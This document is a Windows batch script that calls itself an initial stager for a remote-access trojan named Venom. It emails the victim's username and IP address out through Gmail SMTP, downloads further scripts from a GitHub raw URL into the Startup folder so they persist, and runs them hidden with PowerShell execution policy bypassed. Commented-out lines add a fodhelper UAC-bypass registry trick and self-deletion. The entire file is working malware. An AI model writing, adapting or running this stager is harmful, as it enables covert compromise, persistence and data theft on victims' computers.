@echo off
@REM initial stager for rat

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup dir
cd %STARTUP%

@REM setup smtp
powershell $email = "example@gmail.com"; password = "password"; $ip = (Get-NetIPAddress -AddressNetFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "Venom: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);


@REM write payloads to startup

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/rig.ps1 -OutFile rig.ps1"

@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
@rem powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1" -OutFile "installer.ps1"

REM Modify the registry to set the command to run with elevated privileges
@rem reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powershell -ExecutionPolicy Bypass -Command \"& 'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\installer.ps1'\"" /f
@rem powershell -windowstyle hidden -ExcutionPolicy Bypass ./installer.ps1

REM Run fodhelper.exe to trigger the elevated command
@rem start fodhelper.exe


@REM run payload
powershell -windowstyle hidden -ExecutionPolicy Bypass ./wget.cmd

@rem powershell -windowstyle hidden -ExecutionPolicy Bypass ./rig.ps1


@REM cd back into initial location
cd "%INITIALPATH%"
pause
@REM self delete
@rem del initial.cmd
